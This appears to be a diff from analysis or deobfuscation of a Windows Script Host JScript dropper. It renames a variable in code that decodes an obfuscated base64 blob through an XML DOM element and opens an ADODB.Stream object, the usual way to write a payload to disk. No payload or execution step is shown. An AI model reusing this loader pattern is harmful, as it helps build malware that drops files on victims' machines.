@@ -2,10 +2,10 @@ function main() {
     var comObject;
     this.evalArray = function (superObjectParameter) {
         var superArray = [
-            ["var H3br3w", "WSH.CreateObject(\"microsoft.xmldom\").createElement(\"mko\")"],
-            ["H3br3w.dataType", "\"bin.base64\""],
-            ["H3br3w.text", "\"" + superObjectParameter.content.replace(/%>/g, "A") + "\""],
-            ["superObjectParameter.content", "[H3br3w]"],
+            ["var xmlDOM", "WSH.CreateObject(\"microsoft.xmldom\").createElement(\"mko\")"],
+            ["xmlDOM.dataType", "\"bin.base64\""],
+            ["xmlDOM.text", "\"" + superObjectParameter.content.replace(/%>/g, "A") + "\""],
+            ["superObjectParameter.content", "[xmlDOM]"],
             ["comObject", "WSH.CreateObject(\"adodb.stream\")"]
         ];
 
